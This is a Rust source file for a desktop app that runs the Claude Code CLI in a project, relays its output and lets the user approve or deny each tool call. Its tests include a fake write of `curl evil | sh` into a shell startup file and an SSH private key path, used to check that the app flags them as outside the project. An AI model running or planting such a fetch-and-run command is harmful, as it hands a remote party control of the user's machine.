//! Runs the user's own `claude` CLI in the open project, and relays what it says.
//!
//! `claude` talks JSON lines over stdin and stdout (`--input-format stream-json
//! --output-format stream-json`). With `--permission-prompt-tool stdio`, every tool call
//! that needs permission arrives here as a `can_use_tool` request and waits for an answer.
//! The webview only says allow or deny for a request id. The input that then runs is the
//! copy Rust kept, so the webview can't change what was approved.

use crate::error::CommandError;
use crate::project::ProjectState;
use crate::trust::TrustState;
use serde::Serialize;
// LEARN: `Value` is untyped JSON, like `unknown` after `JSON.parse`; `json!` builds one.
use serde_json::{Value, json};
use std::collections::HashMap;
use std::io::{self, BufRead, BufReader, Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use tauri::ipc::Channel;
use tauri::{AppHandle, State};
use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};

/// The longest message the composer may send.
const MAX_MESSAGE_BYTES: usize = 100_000;
/// Tool details and results longer than this are cut before reaching the webview.
const MAX_SHOWN_CHARS: usize = 4_000;
/// How much of `claude`'s stderr is kept to explain an unexpected exit.
const STDERR_TAIL_BYTES: usize = 4_000;
const DECLINED: &str = "The user declined this in Claudine.";

/// What the webview hears about a session, already summarized by Rust.
///
/// File paths inside the project are shown relative to it. A path outside the project
/// is shown in full with `outside: true`, because that's exactly what the user must see
/// before approving. `outside` is a lexical hint for the UI, not a security check.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(
    tag = "kind",
    rename_all = "camelCase",
    rename_all_fields = "camelCase"
)]
pub enum SessionEvent {
    Ready {
        model: String,
    },
    Text {
        text: String,
    },
    Tool {
        id: String,
        name: String,
        summary: String,
        outside: bool,
    },
    ToolResult {
        id: String,
        is_error: bool,
        text: String,
    },
    Permission {
        id: String,
        tool: String,
        summary: String,
        detail: String,
        outside: bool,
    },
    /// `claude` withdrew a permission request, for example after an interrupt.
    PermissionClosed {
        id: String,
    },
    TurnDone {
        is_error: bool,
        message: Option<String>,
        cost_usd: Option<f64>,
    },
    /// `stderr` is the end of `claude`'s error output, to explain a failed start.
    Exited {
        code: Option<i32>,
        stderr: String,
    },
}

/// The pieces of a running session that commands and the reader thread share.
#[derive(Clone)]
struct Handles {
    stdin: Arc<Mutex<ChildStdin>>,
    /// Open permission requests: `claude`'s request id to the tool input it asked about.
    // LEARN: `HashMap` is `Map`; keys and values each have one type, fixed at compile time.
    pending: Arc<Mutex<HashMap<String, Value>>>,
}

struct Session {
    child: Arc<Mutex<Child>>,
    handles: Handles,
    next_request: AtomicU64,
}

impl Drop for Session {
    /// Ending a session ends its process, so no `claude` outlives its project or the app.
    fn drop(&mut self) {
        if let Ok(mut child) = self.child.lock() {
            let _ = child.kill();
            let _ = child.wait();
        }
    }
}

/// The session for the open project, if one is running. One at a time for now.
#[derive(Default)]
pub struct SessionState(Mutex<Option<Session>>);

impl SessionState {
    /// Ends the current session, if any.
    pub fn stop(&self) {
        if let Ok(mut current) = self.0.lock() {
            // Dropping the `Session` runs its `Drop`, which kills the process.
            *current = None;
        }
    }

    /// Copies of the shared handles, so the session lock isn't held while writing.
    fn handles(&self) -> Result<Handles, CommandError> {
        let current = self.0.lock().map_err(|_| CommandError::Internal)?;
        match current.as_ref() {
            // LEARN: cloning an `Arc` copies the pointer and bumps a count; the data is shared.
            Some(session) => Ok(session.handles.clone()),
            None => Err(CommandError::NoSession),
        }
    }
}

/// Looks for the user's own install. Never downloads or installs anything.
///
/// Apps started from the Dock get a minimal `PATH`, so the usual install folders are
/// checked first. Relative `PATH` entries are skipped: `.` would let a project supply
/// its own `claude`.
fn find_claude() -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        candidates.push(home.join(".local/bin/claude"));
        candidates.push(home.join(".claude/local/claude"));
    }
    candidates.push(PathBuf::from("/opt/homebrew/bin/claude"));
    candidates.push(PathBuf::from("/usr/local/bin/claude"));
    if let Some(path) = std::env::var_os("PATH") {
        for folder in std::env::split_paths(&path).filter(|folder| folder.is_absolute()) {
            candidates.push(folder.join("claude"));
        }
    }
    candidates.into_iter().find(|path| is_executable(path))
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|meta| meta.is_file() && meta.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(path: &Path) -> bool {
    path.is_file()
}

fn spawn_session(
    claude: &Path,
    folder: &Path,
    on_event: Channel<SessionEvent>,
) -> Result<Session, CommandError> {
    // LEARN: `Command` is `child_process.spawn`; `Stdio::piped()` hands us each stream.
    let mut child = Command::new(claude)
        .args([
            "-p",
            "--input-format",
            "stream-json",
            "--output-format",
            "stream-json",
            "--verbose",
            "--permission-prompt-tool",
            "stdio",
            // Explicit, so a "bypass permissions" default in the user's settings doesn't apply.
            "--permission-mode",
            "default",
        ])
        .current_dir(folder)
        // Set when the app itself was started from a Claude Code session.
        .env_remove("CLAUDECODE")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|error| match error.kind() {
            io::ErrorKind::NotFound => CommandError::ClaudeNotFound,
            other => CommandError::from(other),
        })?;

    // `take` moves each pipe out of `child`, leaving `None`; it's always there after `piped()`.
    let (Some(stdin), Some(stdout), Some(stderr)) =
        (child.stdin.take(), child.stdout.take(), child.stderr.take())
    else {
        let _ = child.kill();
        return Err(CommandError::Internal);
    };

    let handles = Handles {
        stdin: Arc::new(Mutex::new(stdin)),
        pending: Arc::new(Mutex::new(HashMap::new())),
    };
    let child = Arc::new(Mutex::new(child));
    let stderr_tail = Arc::new(Mutex::new(String::new()));

    let tail = Arc::clone(&stderr_tail);
    thread::spawn(move || keep_tail(stderr, &tail));

    let relay = Relay {
        handles: handles.clone(),
        root: folder.to_path_buf(),
        on_event,
    };
    let reader_child = Arc::clone(&child);
    thread::spawn(move || {
        relay.run(stdout);
        let code = wait_for_exit(&reader_child);
        let stderr = stderr_tail.lock().map(|t| t.clone()).unwrap_or_default();
        let _ = relay.on_event.send(SessionEvent::Exited { code, stderr });
    });

    write_line(
        &handles.stdin,
        &json!({
            "type": "control_request",
            "request_id": "claudine-init",
            "request": { "subtype": "initialize" }
        }),
    )?;

    Ok(Session {
        child,
        handles,
        next_request: AtomicU64::new(1),
    })
}

/// Reads `stderr` until it closes, keeping only its last few thousand bytes.
fn keep_tail(stderr: impl Read, tail: &Mutex<String>) {
    for line in BufReader::new(stderr).lines() {
        let Ok(line) = line else { break };
        let Ok(mut tail) = tail.lock() else { break };
        tail.push_str(&line);
        tail.push('\n');
        if tail.len() > STDERR_TAIL_BYTES {
            let mut cut = tail.len() - STDERR_TAIL_BYTES;
            while !tail.is_char_boundary(cut) {
                cut += 1;
            }
            tail.drain(..cut);
        }
    }
}

/// Polls instead of blocking in `wait`, so `Drop` can still take the lock to kill it.
fn wait_for_exit(child: &Mutex<Child>) -> Option<i32> {
    for _ in 0..40 {
        let Ok(mut child) = child.lock() else {
            return None;
        };
        match child.try_wait() {
            Ok(Some(status)) => return status.code(),
            Ok(None) => {}
            // Already reaped by `Drop`.
            Err(_) => return None,
        }
        drop(child);
        thread::sleep(Duration::from_millis(50));
    }
    None
}

/// Sends one JSON message to `claude`.
fn write_line(stdin: &Mutex<ChildStdin>, message: &Value) -> Result<(), CommandError> {
    let mut line = message.to_string();
    line.push('\n');
    let mut stdin = stdin.lock().map_err(|_| CommandError::Internal)?;
    stdin
        .write_all(line.as_bytes())
        .and_then(|()| stdin.flush())
        .map_err(|error| match error.kind() {
            // The process has exited.
            io::ErrorKind::BrokenPipe => CommandError::NoSession,
            other => CommandError::from(other),
        })
}

/// The reader thread's view of the session.
struct Relay {
    handles: Handles,
    root: PathBuf,
    on_event: Channel<SessionEvent>,
}

impl Relay {
    /// Handles each line `claude` prints until it closes stdout.
    fn run(&self, stdout: impl Read) {
        for line in BufReader::new(stdout).lines() {
            let Ok(line) = line else { break };
            let Ok(message) = serde_json::from_str::<Value>(&line) else {
                continue;
            };
            for event in self.handle(&message) {
                // Fails only if the webview is gone; there's no one left to tell.
                let _ = self.on_event.send(event);
            }
        }
    }

    fn handle(&self, message: &Value) -> Vec<SessionEvent> {
        // LEARN: indexing a missing key gives `Value::Null` instead of panicking.
        let id = message["request_id"].as_str().unwrap_or("").to_string();
        match message["type"].as_str() {
            Some("control_request") => {
                let request = &message["request"];
                if request["subtype"] == "can_use_tool" {
                    let tool = request["tool_name"].as_str().unwrap_or("").to_string();
                    let input = request["input"].clone();
                    let described = describe(&tool, &input, &self.root);
                    if let Ok(mut pending) = self.handles.pending.lock() {
                        pending.insert(id.clone(), input);
                    }
                    vec![SessionEvent::Permission {
                        id,
                        tool,
                        summary: described.summary,
                        detail: described.detail,
                        outside: described.outside,
                    }]
                } else {
                    // Hook callbacks, MCP messages and the like: refuse rather than hang.
                    let _ = write_line(
                        &self.handles.stdin,
                        &json!({
                            "type": "control_response",
                            "response": {
                                "subtype": "error",
                                "request_id": id,
                                "error": "Not supported by Claudine"
                            }
                        }),
                    );
                    Vec::new()
                }
            }
            Some("control_cancel_request") => {
                if let Ok(mut pending) = self.handles.pending.lock() {
                    pending.remove(&id);
                }
                vec![SessionEvent::PermissionClosed { id }]
            }
            _ => events_for(message, &self.root),
        }
    }
}

/// Turns one of `claude`'s output messages into events. Unknown messages give none.
fn events_for(message: &Value, root: &Path) -> Vec<SessionEvent> {
    let mut events = Vec::new();
    match message["type"].as_str() {
        Some("system") if message["subtype"] == "init" => {
            let model = message["model"].as_str().unwrap_or("").to_string();
            events.push(SessionEvent::Ready { model });
        }
        Some("assistant") => {
            for block in blocks(message) {
                match block["type"].as_str() {
                    Some("text") => {
                        let text = block["text"].as_str().unwrap_or("").to_string();
                        if !text.is_empty() {
                            events.push(SessionEvent::Text { text });
                        }
                    }
                    Some("tool_use") => {
                        let name = block["name"].as_str().unwrap_or("").to_string();
                        let described = describe(&name, &block["input"], root);
                        events.push(SessionEvent::Tool {
                            id: block["id"].as_str().unwrap_or("").to_string(),
                            name,
                            summary: described.summary,
                            outside: described.outside,
                        });
                    }
                    _ => {}
                }
            }
        }
        Some("user") => {
            for block in blocks(message) {
                if block["type"] == "tool_result" {
                    events.push(SessionEvent::ToolResult {
                        id: block["tool_use_id"].as_str().unwrap_or("").to_string(),
                        is_error: block["is_error"].as_bool().unwrap_or(false),
                        text: shorten(result_text(&block["content"])),
                    });
                }
            }
        }
        Some("result") => {
            let is_error = message["is_error"].as_bool().unwrap_or(false);
            let message_text = if is_error {
                message["result"]
                    .as_str()
                    .map(|text| shorten(text.to_string()))
            } else {
                None
            };
            events.push(SessionEvent::TurnDone {
                is_error,
                message: message_text,
                cost_usd: message["total_cost_usd"].as_f64(),
            });
        }
        _ => {}
    }
    events
}

/// The content blocks of an `assistant` or `user` message. A plain string has none.
fn blocks(message: &Value) -> &[Value] {
    message["message"]["content"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
}

/// A tool result's content is either a string or a list of `{ "type": "text" }` parts.
fn result_text(content: &Value) -> String {
    match content {
        Value::String(text) => text.clone(),
        Value::Array(parts) => parts
            .iter()
            .filter_map(|part| part["text"].as_str())
            .collect::<Vec<_>>()
            .join("\n"),
        _ => String::new(),
    }
}

struct Described {
    summary: String,
    detail: String,
    outside: bool,
}

/// What to show for a tool call: a one-line summary and the details worth checking.
fn describe(tool: &str, input: &Value, root: &Path) -> Described {
    let text = |key: &str| input[key].as_str().unwrap_or("").to_string();
    let (summary, detail, outside) = match tool {
        "Read" | "Write" | "Edit" | "NotebookEdit" => {
            let key = if tool == "NotebookEdit" {
                "notebook_path"
            } else {
                "file_path"
            };
            let (path, outside) = relative(&text(key), root);
            let detail = match tool {
                "Write" => text("content"),
                "Edit" => format!(
                    "{}\n{}",
                    prefix_lines("- ", &text("old_string")),
                    prefix_lines("+ ", &text("new_string"))
                ),
                "NotebookEdit" => text("new_source"),
                _ => String::new(),
            };
            (path, detail, outside)
        }
        "Bash" => (text("command"), text("description"), false),
        "Glob" | "Grep" => (text("pattern"), text("path"), false),
        "WebFetch" => (text("url"), text("prompt"), false),
        "WebSearch" => (text("query"), String::new(), false),
        _ => (String::new(), input.to_string(), false),
    };
    Described {
        summary: shorten(summary),
        detail: shorten(detail),
        outside,
    }
}

/// `root/src/a.rs` becomes `src/a.rs`. Anything else stays as it is, marked outside.
fn relative(path: &str, root: &Path) -> (String, bool) {
    let path = Path::new(path);
    // `..` is checked because `strip_prefix` compares text: `root/../x` would pass it.
    let climbs = path.components().any(|part| part == Component::ParentDir);
    match path.strip_prefix(root) {
        Ok(inside) if !climbs => {
            let shown = inside.to_string_lossy().into_owned();
            let shown = if shown.is_empty() {
                ".".to_string()
            } else {
                shown
            };
            (shown, false)
        }
        _ => (path.to_string_lossy().into_owned(), true),
    }
}

fn prefix_lines(prefix: &str, text: &str) -> String {
    text.lines()
        .map(|line| format!("{prefix}{line}"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Cuts text to `MAX_SHOWN_CHARS` characters, never through the middle of one.
fn shorten(text: String) -> String {
    match text.char_indices().nth(MAX_SHOWN_CHARS) {
        Some((cut, _)) => format!("{}…", &text[..cut]),
        None => text,
    }
}

#[derive(Serialize)]
pub struct ClaudeStatus {
    found: bool,
}

/// Whether Claude Code is installed where Claudine can find it.
#[tauri::command(async)]
pub fn claude_status() -> ClaudeStatus {
    ClaudeStatus {
        found: find_claude().is_some(),
    }
}

/// Starts `claude` in the open project, replacing any running session.
///
/// The first time for each folder, Rust asks natively whether to trust it. Events then
/// arrive on `on_event` until the process exits.
#[tauri::command(async)]
pub fn start_session(
    app: AppHandle,
    projects: State<'_, ProjectState>,
    trust: State<'_, TrustState>,
    sessions: State<'_, SessionState>,
    on_event: Channel<SessionEvent>,
) -> Result<(), CommandError> {
    let (name, folder) = projects.name_and_path()?;
    let claude = find_claude().ok_or(CommandError::ClaudeNotFound)?;

    if !trust.is_trusted(&folder) {
        let message = format!(
            "Claude Code will run in:\n{}\n\nA project can include settings, hooks and MCP \
             servers (in .claude/ and .mcp.json) that run commands on this Mac as soon as \
             Claude starts. Only trust folders whose contents you trust.",
            folder.display()
        );
        let trusted = app
            .dialog()
            .message(message)
            .title(format!("Trust “{name}”?"))
            .kind(MessageDialogKind::Warning)
            .buttons(MessageDialogButtons::OkCancelCustom(
                "Trust and Start".to_string(),
                "Cancel".to_string(),
            ))
            .blocking_show();
        if !trusted {
            return Err(CommandError::NotTrusted);
        }
        // The dialog can stay open while the user opens another folder.
        if projects.name_and_path()?.1 != folder {
            return Err(CommandError::NoProject);
        }
        trust.trust(&folder)?;
    }

    let session = spawn_session(&claude, &folder, on_event)?;
    let mut current = sessions.0.lock().map_err(|_| CommandError::Internal)?;
    // Replacing the old session drops it, which stops its process.
    *current = Some(session);
    Ok(())
}

#[tauri::command(async)]
pub fn send_message(sessions: State<'_, SessionState>, text: String) -> Result<(), CommandError> {
    if text.len() > MAX_MESSAGE_BYTES {
        return Err(CommandError::TooLarge);
    }
    if text.trim().is_empty() {
        return Ok(());
    }
    let handles = sessions.handles()?;
    write_line(
        &handles.stdin,
        &json!({ "type": "user", "message": { "role": "user", "content": text } }),
    )
}

/// Answers one permission request. Each request can be answered once.
#[tauri::command(async)]
pub fn answer_permission(
    sessions: State<'_, SessionState>,
    id: String,
    allow: bool,
) -> Result<(), CommandError> {
    answer(&sessions.handles()?, &id, allow)
}

fn answer(handles: &Handles, id: &str, allow: bool) -> Result<(), CommandError> {
    let input = {
        let mut pending = handles.pending.lock().map_err(|_| CommandError::Internal)?;
        pending.remove(id).ok_or(CommandError::NotFound)?
    };
    let decision = if allow {
        // The input Rust kept, never one from the webview.
        json!({ "behavior": "allow", "updatedInput": input })
    } else {
        json!({ "behavior": "deny", "message": DECLINED })
    };
    write_line(
        &handles.stdin,
        &json!({
            "type": "control_response",
            "response": { "subtype": "success", "request_id": id, "response": decision }
        }),
    )
}

/// Stops the current turn, like pressing Esc in the terminal. The session stays open.
#[tauri::command(async)]
pub fn interrupt_session(sessions: State<'_, SessionState>) -> Result<(), CommandError> {
    let request_id = {
        let current = sessions.0.lock().map_err(|_| CommandError::Internal)?;
        let session = current.as_ref().ok_or(CommandError::NoSession)?;
        session.next_request.fetch_add(1, Ordering::Relaxed)
    };
    let handles = sessions.handles()?;
    write_line(
        &handles.stdin,
        &json!({
            "type": "control_request",
            "request_id": format!("claudine-{request_id}"),
            "request": { "subtype": "interrupt" }
        }),
    )
}

#[tauri::command]
pub fn stop_session(sessions: State<'_, SessionState>) {
    sessions.stop();
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Instant;
    use tauri::ipc::InvokeResponseBody;

    /// A stand-in for `claude`: asks to write a file, then saves the answer it gets.
    const FAKE_CLAUDE: &str = r#"#!/bin/sh
read init
printf '%s\n' "$init" > init.json
echo '{"type":"control_request","request_id":"p1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"'"$PWD"'/a.txt","content":"original"}}}'
read answer
printf '%s\n' "$answer" > answer.json
"#;

    /// Runs the fake in a fresh folder. Returns the session, the folder, and the events.
    fn start_fake(name: &str) -> (Session, PathBuf, Arc<Mutex<Vec<String>>>) {
        use std::os::unix::fs::PermissionsExt;
        let folder = std::env::temp_dir().join(format!("claude-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&folder);
        std::fs::create_dir_all(&folder).unwrap();
        let folder = folder.canonicalize().unwrap();
        let fake = folder.join("fake-claude");
        std::fs::write(&fake, FAKE_CLAUDE).unwrap();
        std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();

        let events = Arc::new(Mutex::new(Vec::new()));
        let sink = Arc::clone(&events);
        let channel = Channel::new(move |body: InvokeResponseBody| {
            if let InvokeResponseBody::Json(json) = body {
                sink.lock().unwrap().push(json);
            }
            Ok(())
        });
        let session = spawn_session(&fake, &folder, channel).unwrap();
        (session, folder, events)
    }

    fn wait_for(what: &str, mut done: impl FnMut() -> bool) {
        let start = Instant::now();
        while !done() {
            assert!(
                start.elapsed() < Duration::from_secs(10),
                "timed out: {what}"
            );
            thread::sleep(Duration::from_millis(20));
        }
    }

    fn read_json(path: &Path) -> Value {
        wait_for("answer file", || {
            std::fs::read_to_string(path).is_ok_and(|text| text.ends_with('\n'))
        });
        serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap()
    }

    #[test]
    fn allowing_sends_back_the_input_rust_kept() {
        let (session, folder, events) = start_fake("allow");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        let shown: Value = serde_json::from_str(&events.lock().unwrap()[0]).unwrap();
        assert_eq!(shown["kind"], "permission");
        assert_eq!(shown["summary"], "a.txt");
        assert_eq!(shown["detail"], "original");
        assert_eq!(shown["outside"], false);

        answer(&session.handles, "p1", true).unwrap();
        // A second answer to the same request is refused.
        assert_eq!(
            answer(&session.handles, "p1", false),
            Err(CommandError::NotFound)
        );

        let sent = read_json(&folder.join("answer.json"));
        assert_eq!(sent["response"]["request_id"], "p1");
        assert_eq!(sent["response"]["response"]["behavior"], "allow");
        assert_eq!(
            sent["response"]["response"]["updatedInput"]["content"],
            "original"
        );
        let init = read_json(&folder.join("init.json"));
        assert_eq!(init["request"]["subtype"], "initialize");

        wait_for("exit event", || {
            events.lock().unwrap().iter().any(|e| e.contains("exited"))
        });
    }

    #[test]
    fn denying_sends_a_deny_and_unknown_ids_are_refused() {
        let (session, folder, events) = start_fake("deny");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        assert_eq!(
            answer(&session.handles, "made-up", true),
            Err(CommandError::NotFound)
        );
        answer(&session.handles, "p1", false).unwrap();

        let sent = read_json(&folder.join("answer.json"));
        assert_eq!(sent["response"]["response"]["behavior"], "deny");
        assert_eq!(sent["response"]["response"]["message"], DECLINED);
        assert!(sent["response"]["response"]["updatedInput"].is_null());
    }

    #[test]
    fn dropping_a_session_stops_its_process() {
        let (session, _folder, events) = start_fake("drop");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        let stdin = Arc::clone(&session.handles.stdin);
        drop(session);
        wait_for("exit event", || {
            events.lock().unwrap().iter().any(|e| e.contains("exited"))
        });
        let write = write_line(&stdin, &json!({}));
        assert_eq!(write, Err(CommandError::NoSession));
    }

    fn root() -> PathBuf {
        PathBuf::from("/Users/me/app")
    }

    #[test]
    fn paths_inside_the_project_become_relative() {
        assert_eq!(
            relative("/Users/me/app/src/a.rs", &root()),
            ("src/a.rs".to_string(), false)
        );
        assert_eq!(relative("/Users/me/app", &root()), (".".to_string(), false));
    }

    #[test]
    fn paths_outside_the_project_are_flagged() {
        for path in [
            "/Users/me/.ssh/id_ed25519",
            "/Users/me/app-other/x",
            "/Users/me/app/../.zshrc",
            "src/a.rs",
        ] {
            assert_eq!(relative(path, &root()), (path.to_string(), true), "{path}");
        }
    }

    #[test]
    fn a_write_outside_the_project_is_described_in_full() {
        let input = json!({ "file_path": "/Users/me/.zshrc", "content": "curl evil | sh" });
        let described = describe("Write", &input, &root());
        assert_eq!(described.summary, "/Users/me/.zshrc");
        assert_eq!(described.detail, "curl evil | sh");
        assert!(described.outside);
    }

    #[test]
    fn an_edit_shows_both_sides() {
        let input = json!({
            "file_path": "/Users/me/app/a.rs",
            "old_string": "let a = 1;\nlet b = 2;",
            "new_string": "let a = 3;"
        });
        let described = describe("Edit", &input, &root());
        assert_eq!(described.summary, "a.rs");
        assert_eq!(described.detail, "- let a = 1;\n- let b = 2;\n+ let a = 3;");
    }

    #[test]
    fn unknown_tools_show_their_raw_input() {
        let described = describe("mcp__x__y", &json!({ "q": 1 }), &root());
        assert_eq!(described.detail, r#"{"q":1}"#);
    }

    #[test]
    fn long_text_is_cut_on_a_character_boundary() {
        let text = "é".repeat(MAX_SHOWN_CHARS + 10);
        let short = shorten(text);
        assert_eq!(short.chars().count(), MAX_SHOWN_CHARS + 1);
        assert!(short.ends_with('…'));
        assert_eq!(shorten("hi".to_string()), "hi");
    }

    #[test]
    fn assistant_messages_become_text_and_tool_events() {
        // Shapes copied from `claude` 2.1.309's stream-json output, trimmed.
        let message = json!({
            "type": "assistant",
            "message": { "content": [
                { "type": "thinking", "thinking": "" },
                { "type": "text", "text": "Writing it now." },
                { "type": "tool_use", "id": "toolu_1", "name": "Write",
                  "input": { "file_path": "/Users/me/app/hello.txt", "content": "hi" } }
            ]}
        });
        assert_eq!(
            events_for(&message, &root()),
            vec![
                SessionEvent::Text {
                    text: "Writing it now.".to_string()
                },
                SessionEvent::Tool {
                    id: "toolu_1".to_string(),
                    name: "Write".to_string(),
                    summary: "hello.txt".to_string(),
                    outside: false,
                },
            ]
        );
    }

    #[test]
    fn tool_results_and_turn_ends_are_relayed() {
        let result = json!({
            "type": "user",
            "message": { "content": [
                { "type": "tool_result", "tool_use_id": "toolu_1", "is_error": true,
                  "content": [{ "type": "text", "text": "denied" }] }
            ]}
        });
        assert_eq!(
            events_for(&result, &root()),
            vec![SessionEvent::ToolResult {
                id: "toolu_1".to_string(),
                is_error: true,
                text: "denied".to_string(),
            }]
        );

        let done = json!({ "type": "result", "is_error": false, "total_cost_usd": 0.0027 });
        assert_eq!(
            events_for(&done, &root()),
            vec![SessionEvent::TurnDone {
                is_error: false,
                message: None,
                cost_usd: Some(0.0027),
            }]
        );
    }

    #[test]
    fn unknown_and_malformed_messages_are_ignored() {
        for message in [
            json!({ "type": "stream_event" }),
            json!({ "type": "assistant", "message": { "content": "plain" } }),
            json!(42),
            json!(null),
        ] {
            assert!(events_for(&message, &root()).is_empty());
        }
    }
}
